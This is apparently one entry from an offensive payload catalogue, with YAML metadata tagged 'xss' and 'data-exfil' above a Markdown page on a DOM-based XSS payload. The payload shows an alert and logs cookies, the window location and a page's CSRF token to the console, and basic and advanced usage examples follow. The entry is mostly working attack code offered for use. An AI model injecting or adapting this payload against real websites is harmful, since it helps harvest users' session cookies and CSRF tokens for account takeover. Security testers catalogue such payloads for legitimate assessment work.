---
id: cmd-001
data: >-
  <script>alert("XSS By Tiago")console.log("Document:",
  document)console.log("Window:", window)console.log("Cookies:",
  document.cookie)console.log("Location:", window.location)console.log("CSRF
  Token:",
  document.querySelectorAll('[data-serialized-id="csrf"]')[0].innerText)</script>
tags:
  - xss
  - data-exfil
type: command
output: Alert 'XSS By Tiago'; console logs with sensitive data
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:18.378Z'
verified: false
validated: true
submitted: true
---
# xss-alert-and-log-sensitive-data

## Command

```javascript
alert("XSS By Tiago")
console.log("Document:", document)
console.log("Window:", window)
console.log("Cookies:", document.cookie)
console.log("Location:", window.location)
console.log("CSRF Token:", document.querySelectorAll('[data-serialized-id="csrf"]')[0].innerText)
```

## Description

JavaScript payload for DOM-based XSS that alerts success and logs admin-sensitive information like document objects, cookies, location, and CSRF tokens via querySelector.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| querySelectorAll | Selects elements with data-serialized-id='csrf' | Yes |

## Examples

### Basic Usage

```javascript
alert("XSS By Tiago")
console.log(document.cookie)
```

### Advanced Usage

```javascript
console.log("CSRF Token:", document.querySelectorAll('[data-serialized-id="csrf"]')[0].innerText)
```

## Expected Output

Browser alert pops 'XSS By Tiago'; developer console displays logged objects including cookies and token values.

## Related

- [[Related Procedure: Create-XSS-Payload-Page]]
